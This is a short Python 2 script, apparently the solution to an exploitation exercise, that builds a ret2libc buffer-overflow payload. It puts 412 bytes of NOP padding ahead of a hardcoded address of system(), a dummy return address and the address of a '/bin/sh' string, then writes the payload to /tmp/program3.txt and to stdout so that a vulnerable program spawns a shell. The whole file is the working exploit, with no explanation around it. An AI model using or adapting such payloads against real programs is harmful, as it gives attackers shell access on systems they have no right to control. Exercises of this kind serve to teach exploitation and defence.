import struct
import sys

system_addr = 0xb7e5f460
bin_sh_addr = 0xb7f81ff8
padding = "\x90"*412

payload = padding
payload += struct.pack('<I',system_addr)
payload += struct.pack('<I',0xd3adc0d3)
payload += struct.pack('<I',bin_sh_addr)

file("/tmp/program3.txt",'w').write(payload)
sys.stdout.write(payload)
